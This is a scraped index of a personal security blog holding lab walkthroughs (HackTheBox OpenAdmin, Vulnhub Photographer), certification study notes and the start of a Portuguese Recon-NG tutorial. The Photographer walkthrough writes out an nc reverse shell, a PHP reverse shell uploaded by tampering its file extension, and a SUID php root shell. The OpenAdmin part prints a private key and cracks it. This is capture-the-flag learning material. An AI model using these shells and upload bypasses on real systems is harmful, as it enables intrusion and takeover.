jimmy@openadmin:~$ curl 127.0.0.1:52846/main.php &lt;pre&gt;-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8 ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE 6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI 9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4 piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/ /U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH 40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb 9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80 X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr 1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2 XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79 yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM +4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN -----END RSA PRIVATE KEY----- &lt;/pre&gt;&lt;html&gt; &lt;h3&gt;Don&#39;t forget your &#34;ninja&#34; password&lt;/h3&gt; Click here to logout &lt;a href=&#34;logout.php&#34; tite = &#34;Logout&#34;&gt;Session &lt;/html&gt;I tried to logon without a password, with not success. It&rsquo;s needed to brute this key and get its password.
First we adjust the RSA key to john file model:
/usr/share/john/ssh2john.py joanna.txt &gt; joannarsa.txt # cat joannarsa.txt joanna.txt:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10dThen crack it with john: Now we can switch to joanna user!
&nbsp; You need the original copy of rsa key to use here! And need to change it&rsquo;s permissions. $ chmod 600 joanna.txt Here you can get the user.txt flag.
$ cat user.txt🛡️Privilege Escalation &nbsp; Let&rsquo;s check joanna&rsquo;s sudo permission:
joanna@openadmin:~$ sudo -l Matching Defaults entries for joanna on openadmin: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User joanna may run the following commands on openadmin: (ALL) NOPASSWD: /bin/nano /opt/priv 🍻Complete &nbsp; Let&rsquo;s open nano with sudo privileges:
$ sudo nano /opt/privPress CTRL+R, type /root/root.txt and press ENTER.
And now we got the root flag.`}).add({id:107,tag:"en",href:"/tags/openctibr/",title:"Openctibr",description:"",content:""}).add({id:108,tag:"en",href:"/tags/openvas/",title:"Openvas",description:"",content:""}).add({id:109,tag:"en",href:"/tags/oreilly/",title:"Oreilly",description:"",content:""}).add({id:110,tag:"en",href:"/tags/osint/",title:"Osint",description:"",content:""}).add({id:111,tag:"en",href:"/tags/owasp/",title:"Owasp",description:"",content:""}).add({id:112,tag:"en",href:"/tags/pandas/",title:"Pandas",description:"",content:""}).add({id:113,tag:"en",href:"/blog/passed_ccsp/",title:"Passed (ISC)2 CCSP - Certified Cloud Security Professional",description:"My study resouces to achieve CCSP certification.",content:`Hello guys,
Monday, 27th March I passed CCSP exam here in São Paulo, the material I&rsquo;ll list bellow had the enough content to pass. Thankfully I&rsquo;m already CISSP, which made my life easier in some parts of the exam. I could finish the test in 2 hours with review and going to toilet once.
CCSP Certified Cloud Security Professional All-in-One Exam Guide (Daniel Carter) This was my main resource. Read once carefully with notes, did all chapter exercises, fast review later and then installed Total Tester (cd included) and simulated a exam (125 questions, 4 hours)
CSA Guide v3: https://downloads.cloudsecurityalliance.org/assets/research/security-guidance/csaguide.v3.0.pdf Read once.
ENISA Cloud Computing Risk Assessment: https://www.enisa.europa.eu/publications/cloud-computing-risk-assessment Read once.
I wish I helped some of you here.
Thank you!`}).add({id:114,tag:"en",href:"/blog/passed_cissp/",title:"Passed (ISC)2 CISSP - Certified Information Systems Security Professional",description:"My resources of study to achieve CISSP certification.",content:`My resources of study to achieve CISSP certification.
Hi folks.
First of all I&rsquo;d like to thanks everybody here who posted tips and steps to conquer the best results on the exam.
I took me 8 months of studies, I read the books bellow:
Cissp Study Guide (Eric Conrad) - Read Twice CISSP ALL In One 6th - Read BCP/DRP, and other chapters just as references
My practice tests were based on:
CISSP Practice Exams Book (Shon Harris) CISSP AIO 6th exercices FreePracticeTests.org McGraw-Hill Education | CISSP Practice Exams Elsevier: conrad: CISSP Study Guide Practice Exams
And I&rsquo;m part of ISSA Brazil Chapter in São Paulo, that creates a study group every semester.`}).add({id:115,tag:"en",href:"/blog/photographer_vulnhub/",title:"Photographer: 1 - Vulnhub ",description:"Photographer: 1 - A Vulnhub vulnerable machine walkthrough.",content:`🔎 Enumeration Portscan TCP Portscan UDP 80/tcp 8000/tcp 445/tcp 🚪🚶 Foothold Method 1: In Physical Access Context Method 2: In Web Access Context 🛡️ Privilege Escalation 🍻 Complete 🔎 Enumeration &nbsp; Portscan TCP &nbsp; root@kali:~# nmap -sV -A -O 192.168.210.130 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-30 16:58 -03 Nmap scan report for 192.168.210.130 Host is up (0.00028s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Photographer by v1n1v131r4 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 8000/tcp open ssl/http-alt Apache/2.4.18 (Ubuntu) |_http-generator: Koken 0.22.24 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: daisa ahomi MAC Address: 00:0C:29:4E:11:F1 (VMware) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop Service Info: Host: PHOTOGRAPHER Host script results: |_clock-skew: mean: -1h40m00s, deviation: 2h18m34s, median: -3h00m01s |_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: photographer | NetBIOS computer name: PHOTOGRAPHER\\x00 | Domain name: \\x00 | FQDN: photographer |_ System time: 2020-07-30T12:59:52-04:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-07-30T16:59:52 |_ start_date: N/A TRACEROUTE HOP RTT ADDRESS 1 0.28 ms 192.168.210.130 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 143.87 seconds Portscan UDP &nbsp; nmap -sU 192.168.210.130 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 09:34 -03 Nmap scan report for 192.168.210.130 Host is up (0.00070s latency). Not shown: 995 closed ports PORT STATE SERVICE 68/udp open|filtered dhcpc 137/udp open netbios-ns 138/udp open|filtered netbios-dgm 631/udp open|filtered ipp 5353/udp open|filtered zeroconf 80/tcp &nbsp; Nothing especial on port 80.
8000/tcp &nbsp; Navigating on pages, at Content specifically, we found something interesting. Either the author forgot it uploaded or is trying to hacking us receiving shells&hellip; 🤔
This is the Koken CMS
445/tcp &nbsp; Lets keep digging..
List all samba shares.
smbclient -L //192.168.210.130 Enter WORKGROUP\\root&#39;s password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers sambashare Disk Samba on Ubuntu IPC$ IPC IPC Service (photographer server (Samba, Ubuntu)) SMB1 disabled -- no workgroup availableGet more info about these shares.
nmap --script smb-enum-shares -p 445 192.168.210.130 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-30 22:07 -03 Nmap scan report for 192.168.210.130 Host is up (0.00034s latency). PORT STATE SERVICE 445/tcp open microsoft-ds MAC Address: 00:0C:29:4E:11:F1 (VMware) Host script results: | smb-enum-shares: | account_used: guest | \\\\192.168.210.130\\IPC$: | Type: STYPE_IPC_HIDDEN | Comment: IPC Service (photographer server (Samba, Ubuntu)) | Users: 2 | Max Users: &lt;unlimited&gt; | Path: C:\\tmp | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\192.168.210.130\\print$: | Type: STYPE_DISKTREE | Comment: Printer Drivers | Users: 0 | Max Users: &lt;unlimited&gt; | Path: C:\\var\\lib\\samba\\printers | Anonymous access: &lt;none&gt; | Current user access: &lt;none&gt; | \\\\192.168.210.130\\sambashare: | Type: STYPE_DISKTREE | Comment: Samba on Ubuntu | Users: 0 | Max Users: &lt;unlimited&gt; | Path: C:\\home\\agi\\share | Anonymous access: READ/WRITE |_ Current user access: READ/WRITELooking at the content of the share &ldquo;sambashare&rdquo;.
smbclient //192.168.210.130/sambashare -U guest Enter WORKGROUP\\guest&#39;s password: Try &#34;help&#34; to get a list of possible commands. smb: \\&gt; ls . D 0 Mon Jul 20 22:30:07 2020 .. D 0 Tue Jul 21 06:44:25 2020 mailsent.txt N 503 Mon Jul 20 22:29:40 2020 wordpress.bkp.zip N 13930308 Mon Jul 20 22:22:23 2020 278627392 blocks of size 1024. 264268400 blocks available smb: \\&gt;Download recursively all content.
root@kali:~/Downloads# smbget -rR smb://192.168.210.130/sambashare -U guest Password for [guest] connecting to //sambashare/192.168.210.130: Using workgroup WORKGROUP, user guest smb://192.168.210.130/sambashare/mailsent.txt smb://192.168.210.130/sambashare/wordpress.bkp.zip Downloaded 13.29MB in 2 secondsLooking at mailsent.txt
cat mailsent.txt Now we have the two emails regarding to the users we found at passwd file, agi@photographer.com and daisa@photographer.com.
You don&rsquo;t have to bruteforce anything, just type user as daisa@photographer.com and password babygirl.
🚪🚶 Foothold &nbsp; Method 1: In Physical Access Context &nbsp; User Guest has no password.
Let me get the IP.
In Kali:
nc -nlvp 1234$ rm -f /tmp/pipe ; mkfifo /tmp/pipe ; cat /tmp/pipe | /bin/bash -i 2&gt;&amp;1 | nc 192.168.210.129 1234 &gt; /tmp/pipe Received shell from machine
Method 2: In Web Access Context &nbsp; Recently, the author Vinicius Vieira has published a vulnerability regarding to this application and its version. Which makes out job easier: https://www.exploit-db.com/exploits/48706.
I&rsquo;m going to use a PHP reverse shell which I love!
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
vim php-reverse-shell.phpChange the IP and port (if necessary).
... set_time_limit (0); $VERSION = &#34;1.0&#34;; $ip = &#39;192.168.210.129&#39;; // CHANGE THIS $port = 1234; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = &#39;uname -a; w; id; /bin/sh -i&#39;; $daemon = 0; $debug = 0; ...Now we are going to upload some malicious content.
Let&rsquo;s prepare our attacker machine to receive the connection.
nc -nlvp 1234Now, make a copy of php adding an extention .jpeg.
cp php-reverse-shell.php php-reverse-shell.php.jpegTime to upload the malicious payload.
First of all, start to intercept everything with a web proxy like BurpSuite.
Upload and import it.
On Burp, tamper it from .php.jpeg to only .php.
Just after the upload you have your reverse shell. \\o/
Spawning a better shell.
python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;user.txt: d41d8cd98f00b204e9800998ecf8427e
cat /home/daisa/user.txt 🛡️ Privilege Escalation &nbsp; You can go through all the procedure to found insecure point in the operating system. I&rsquo;ll simplify just by running the LinEnum, which is a good script to automatize this task. You can download it at https://github.com/rebootuser/LinEnum.
./LinEnum.sh -s -k keyword -r report -e /tmp/ -tTaking a look at the binaries with SUID bit active, we found /usr/bin/php7.2 . That&rsquo;s enough.
You can find this vulnerability also typing find / -perm -4000 -print
🍻 Complete &nbsp; Now you just need to explore the active SUID bit on php7.2 binary and execute a PHP script to spawn the root shell.
/usr/bin/php7.2 -r &#34;pcntl_exec(&#39;/bin/bash&#39;, [&#39;-p&#39;]);&#34;`}).add({id:116,tag:"en",href:"/tags/podcast/",title:"Podcast",description:"",content:""}).add({id:117,tag:"en",href:"/tags/porto-alegre/",title:"Porto Alegre",description:"",content:""}).add({id:118,tag:"en",href:"/projects/",title:"Projects",description:"",content:""}).add({id:119,tag:"en",href:"/tags/pygame/",title:"Pygame",description:"",content:""}).add({id:120,tag:"en",href:"/tags/python/",title:"Python",description:"",content:""}).add({id:121,tag:"en",href:"/tags/quarantine/",title:"Quarantine",description:"",content:""}).add({id:122,tag:"en",href:"/tags/quarentena/",title:"Quarentena",description:"",content:""}).add({id:123,tag:"en",href:"/tags/ransomware/",title:"Ransomware",description:"",content:""}).add({id:124,tag:"en",href:"/tags/recon-ng/",title:"Recon-Ng",description:"",content:""}).add({id:125,tag:"en",href:"/blog/recon-ng/",title:"Recon-NG",description:"Como obter informações de organizações alvo, sua infraestrutura e seus colaboradores sem qualquer interação direta. A Recon-NG quick-start! 😉",content:`Sumário &nbsp; Sumário O Recon-NG Introdução Recon-NG - CyberKillChain, Mitre ATT&amp;CK, Bug Bounties Iniciando Recon-NG Configuração de proxy Organizando workspaces Adicionando organizações e seus domínios ao workspace Trabalhando com o marketplace e seus módulos Instalando módulos Executando os módulos e obtendo informações whois_miner whois_pocs google_site_web brute_hosts ipinfodb shodan_ip netcraft resolve reverse_resolve hibp_paste github_miner interesting_files Exibindo na tela informações coletadas Criando Relatório html Recon-web Conclusão Apêndice I - Configuração de APIs IPinfoDB Github HaveIBeenPwned Shodan O Recon-NG &nbsp; O Recon-NG, desenvolvido por Tim Tomes, é um framework de reconhecimento construído com o objetivo de prover um ambiente poderoso e customizável para condução de análise passiva a partir de informações públicas em contexto web.
O Recon-NG pode ser baixado em https://github.com/lanmaster53/recon-ng e por padrão já vem instalado no Kali Linux.
Introdução &nbsp; Como membro do Red Team, você frequentemente enfrenta o dilema de quanto tempo, se houver, de se comprometer com a coleta de informações técnicas.
Nas campanhas é necessário olhar para tudo que está ao redor do alvo a ser analisado, antes mesmo de realizar uma análise ativa diretamente nos recursos conhecidos do alvo, é totalmente viável ter um bom panorama a partir de informações disponíveis publicamente e conhecer melhor o seu alvo de forma passiva. Aí que entramos no conceito de OSINT (Open Source Intelligence).
. O Recon-NG é apenas uma das ferramentas disponíveis para este tipo de trabalho. Mais opções para cada tipo de atividade pode ser consultada no site https://osintframework.com/.
Abaixo um mapa mental inicial das atividades e suas ferramentas exemplificadas em https://osintframework.com/.
Os motivos que me fizeram a escrever material são:
Trabalhei com a versão 3 ou 4 (não me lembro) do Recon-NG, e quando me deparei com a versão 5, todos os comandos que eu me lembrava não funcionavam mais&hellip;😒 Quase todo material disponível nos livros que possuo e nos materiais online disponíveis são para versões abaixo da versão 5. Mudou muito a forma de trabalhar com a ferramenta. Praticamente não há materiais em Português para a nova versão. Principais características do Recon-NG
Mais de 100 módulos disponíveis no marketplace; Pela ferramenta ser construída em Python, é relativamente simples de construir seu próprio módulo. https://github.com/lanmaster53/recon-ng/wiki/Development-Guide; Através de scripts é possível a coleta de informações praticamente sem interrupção, mesmo que levo algumas horas para terminar. Mais informações em https://github.com/lanmaster53/recon-ng/wiki/Features#automation; Web API. https://github.com/lanmaster53/recon-ng/wiki/Development-Guide#web-api; Mais informações em https://github.com/lanmaster53/recon-ng/wiki/Features. Recon-NG - CyberKillChain, Mitre ATT&amp;CK, Bug Bounties &nbsp; Olhando para as metodologias utilizadas, no modelo CyberKillChain o Recon-NG se situa na fase de Reconhecimento (Recon), como já foi mencionado anteriormente.
Olhando no detalhe para as táticas de PRE-ATT&amp;CK do MITRE, o Recon-NG imediatamente atende aos itens TA0015 (Technical Information Gathering) e TA0016 (People Information Gathering).
Tactic Technique ID Name Description Technical Information Gathering T1250 Determine domain and IP address space Domain Names are the human readable names used to represent one or more IP addresses. IP addresses are the unique identifier of computing devices on a network. Both pieces of information are valuable to an adversary who is looking to understand the structure of a network. Technical Information Gathering T1261 Enumerate externally facing software applications technologies, languages, and dependencies Software applications will be built using different technologies, languages, and dependencies. This information may reveal vulnerabilities or opportunities to an adversary. People Information Gathering T1271 Identify personnel with an authority/privilege Personnel internally to a company may have non-electronic specialized access, authorities, or privilege that make them an attractive target for an adversary. One example of this is an individual with financial authority to authorize large transactions. An adversary who compromises this individual might be able to subvert large dollar transfers. Em programas de bug bounty como HackerOne ou BugCrowd, em escopos mais abertos você pode utilizar esta ferramenta e automatizá-la para monitorar as empresas quer você busca por vulnerabilidades e consequentemente recompensas. 🤑
Iniciando Recon-NG &nbsp; root@kali:~# recon-ng
Listando opções
[recon-ng][default] &gt; help Commands (type [help|?] &lt;topic&gt;): --------------------------------- back Exits the current context dashboard Displays a summary of activity db Interfaces with the workspace&#39;s database exit Exits the framework help Displays this menu index Creates a module index (dev only) keys Manages third party resource credentials marketplace Interfaces with the module marketplace modules Interfaces with installed modules options Manages the current context options pdb Starts a Python Debugger session (dev only) script Records and executes command scripts shell Executes shell commands show Shows various framework items snapshots Manages workspace snapshots spool Spools output to a file workspaces Manages workspaces Configuração de proxy &nbsp; Se precisar configurar um proxy, você pode utilizar a opção options.
recon-ng][Boeing] &gt; options list Name Current Value Required Description ---------- ------------- -------- ----------- NAMESERVER 8.8.8.8 yes default nameserver for the resolver mixin PROXY no proxy server (address:port) THREADS 10 yes number of threads (where applicable) TIMEOUT 10 yes socket timeout (seconds) USER-AGENT Recon-ng/v5 yes user-agent string VERBOSITY 1 yes verbosity level (0 = minimal, 1 = verbose, 2 = debug)Para configurar algo necessário, basta utilizar a seguinte expressão, declarando 192.168.0.1 como proxy:
[recon-ng][Boeing] &gt; option set PROXY 192.168.0.1Se precisar desconfigurar algo, ou vc pode subscrever com o próprio set ou usar o unset.
Organizando workspaces &nbsp; Sempre que quiser ver todas as opções de uma determinada opção basta usar a tecla TAB para listar.
[recon-ng] &gt; marketplace &lt;TAB&gt; info install refresh remove searchPrecisamos nos organizar, criaremos um workspace para nosso site.
[recon-ng][default] &gt; workspaces create tiagotavares.io [recon-ng][tiagotavares.io] &gt; Adicionando organizações e seus domínios ao workspace &nbsp; Agora vamos começar a inserir informações das empresas que vamos analisar, para teste vamos exemplificar com a Boeing ✈️.
[recon-ng][tiagotavares.io] &gt; db insert companies company (TEXT): Boeing description (TEXT): Boeing is the world&#39;s largest aerospace company and leading manufacturer. notes (TEXT): [*] 1 rows affected. [recon-ng][tiagotavares.io] &gt;Podemos listar workspaces e companies, como no exemplo abaixo.
[recon-ng][tiagotavares.io] &gt; show companies No mesmo workplaces podemos adicionar quantos empresas quisermos. Vamos adicionar agora a concorrente Airbus e o orgulho nacional, a Embraer.
[recon-ng][tiagotavares.io] &gt; db insert companies company (TEXT): Airbus description (TEXT): notes (TEXT): [*] 1 rows affected. [recon-ng][tiagotavares.io] &gt; db insert companies company (TEXT): Embraer description (TEXT): notes (TEXT): [*] 1 rows affected.[recon-ng][tiagotavares.io] &gt; show companies Vamos adicionar agora seus respectivos domínios para iniciar os trabalhos.
Adicionando boeing.com
[recon-ng][tiago.tavares.io] &gt; db insert domains domain (TEXT): boeing.com notes (TEXT): [*] 1 rows affected.Adicionando airbus.com
[recon-ng][tiago.tavares.io] &gt; db insert domains domain (TEXT): airbus.com notes (TEXT): [*] 1 rows affected.Adicionando embraer.com
[recon-ng][tiago.tavares.io] &gt; db insert domains domain (TEXT): embraer.com notes (TEXT): [*] 1 rows affected. Trabalhando com o marketplace e seus módulos &nbsp; Precisamos tornar o Recon-ng em algo útil, vamos começar a utilizar o marketplace para começar a dar funções a ferramenta.
Primeiro vamos atualizar a base.
[recon-ng][tiagotavares.io] &gt; marketplace refreshAgora vamos buscar todos os módulos disponíveis. Lembrando que é possível desenvolver seu próprio modulo que atenda melhoras as suas necessidades. 😉
Nas últimas colunas D e K respectivamente mostram informações se o módulo possui dependências ou se ele precisa de alguma chave de API.
[recon-ng][tiagotavares.io] &gt; marketplace search +---------------------------------------------------------------------------------------------------+ | Path | Version | Status | Updated | D | K | +---------------------------------------------------------------------------------------------------+ | discovery/info_disclosure/cache_snoop | 1.0 | not installed | 2019-06-24 | | | | discovery/info_disclosure/interesting_files | 1.1 | not installed | 2020-01-13 | | | | exploitation/injection/command_injector | 1.0 | not installed | 2019-06-24 | | | | exploitation/injection/xpath_bruter | 1.2 | not installed | 2019-10-08 | | | | import/csv_file | 1.1 | not installed | 2019-08-09 | | | | import/list | 1.1 | not installed | 2019-06-24 | | | | import/masscan | 1.0 | not installed | 2020-04-07 | | | | import/nmap | 1.0 | not installed | 2019-06-24 | | | | recon/companies-contacts/bing_linkedin_cache | 1.0 | not installed | 2019-06-24 | | * | | recon/companies-contacts/censys_email_address | 1.0 | not installed | 2019-08-22 | | * | | recon/companies-contacts/pen | 1.1 | not installed | 2019-10-15 | | | | recon/companies-domains/censys_subdomains | 1.0 | not installed | 2019-08-22 | | * | | recon/companies-domains/pen | 1.1 | not installed | 2019-10-15 | | | | recon/companies-domains/viewdns_reverse_whois | 1.0 | not installed | 2019-08-08 | | | | recon/companies-domains/whoxy_dns | 1.0 | not installed | 2020-06-17 | | * | | recon/companies-hosts/censys_org | 1.0 | not installed | 2019-08-22 | | * | | recon/companies-hosts/censys_tls_subjects | 1.0 | not installed | 2019-08-22 | | * | | recon/companies-multi/github_miner | 1.1 | not installed | 2020-05-15 | | * | | recon/companies-multi/shodan_org | 1.1 | not installed | 2020-07-01 | * | * | | recon/companies-multi/whois_miner | 1.1 | not installed | 2019-10-15 | | | | recon/contacts-contacts/abc | 1.0 | not installed | 2019-10-11 | * | | | recon/contacts-contacts/mailtester | 1.0 | not installed | 2019-06-24 | | | | recon/contacts-contacts/mangle | 1.0 | not installed | 2019-06-24 | | | | recon/contacts-contacts/unmangle | 1.1 | not installed | 2019-10-27 | | | | recon/contacts-credentials/hibp_breach | 1.2 | not installed | 2019-09-10 | | * | | recon/contacts-credentials/hibp_paste | 1.1 | not installed | 2019-09-10 | | * | | recon/contacts-credentials/scylla | 1.2 | not installed | 2020-06-05 | | | | recon/contacts-domains/migrate_contacts | 1.1 | not installed | 2020-05-17 | | | | recon/contacts-profiles/fullcontact | 1.1 | not installed | 2019-07-24 | | * | | recon/credentials-credentials/adobe | 1.0 | not installed | 2019-06-24 | | | | recon/credentials-credentials/bozocrack | 1.0 | not installed | 2019-06-24 | | | | recon/credentials-credentials/hashes_org | 1.0 | not installed | 2019-06-24 | | * | | recon/domains-companies/censys_companies | 1.0 | not installed | 2019-08-22 | | * | | recon/domains-companies/pen | 1.1 | not installed | 2019-10-15 | | | | recon/domains-companies/whoxy_whois | 1.1 | not installed | 2020-06-24 | | * | | recon/domains-contacts/hunter_io | 1.2 | not installed | 2020-04-14 | | * | | recon/domains-contacts/metacrawler | 1.1 | not installed | 2019-06-24 | * | | | recon/domains-contacts/pen | 1.1 | not installed | 2019-10-15 | | | | recon/domains-contacts/pgp_search | 1.4 | not installed | 2019-10-16 | | | | recon/domains-contacts/whois_pocs | 1.0 | not installed | 2019-06-24 | | | | recon/domains-contacts/wikileaker | 1.0 | not installed | 2020-04-08 | | | | recon/domains-credentials/pwnedlist/account_creds | 1.0 | not installed | 2019-06-24 | * | * | | recon/domains-credentials/pwnedlist/api_usage | 1.0 | not installed | 2019-06-24 | | * | | recon/domains-credentials/pwnedlist/domain_creds | 1.0 | not installed | 2019-06-24 | * | * | | recon/domains-credentials/pwnedlist/domain_ispwned | 1.0 | not installed | 2019-06-24 | | * | | recon/domains-credentials/pwnedlist/leak_lookup | 1.0 | not installed | 2019-06-24 | | | | recon/domains-credentials/pwnedlist/leaks_dump | 1.0 | not installed | 2019-06-24 | | * | | recon/domains-credentials/scylla | 1.2 | not installed | 2020-04-14 | | | | recon/domains-domains/brute_suffix | 1.1 | not installed | 2020-05-17 | | | | recon/domains-hosts/binaryedge | 1.2 | not installed | 2020-06-18 | | * | | recon/domains-hosts/bing_domain_api | 1.0 | not installed | 2019-06-24 | | * | | recon/domains-hosts/bing_domain_web | 1.1 | not installed | 2019-07-04 | | | | recon/domains-hosts/brute_hosts | 1.0 | not installed | 2019-06-24 | | | | recon/domains-hosts/builtwith | 1.0 | not installed | 2019-06-24 | | * | | recon/domains-hosts/censys_domain | 1.0 | not installed | 2019-08-22 | | * | | recon/domains-hosts/certificate_transparency | 1.2 | not installed | 2019-09-16 | | | | recon/domains-hosts/findsubdomains | 1.0 | not installed | 2019-06-24 | | | | recon/domains-hosts/google_site_web | 1.0 | not installed | 2019-06-24 | | | | recon/domains-hosts/hackertarget | 1.1 | installed | 2020-05-17 | | | | 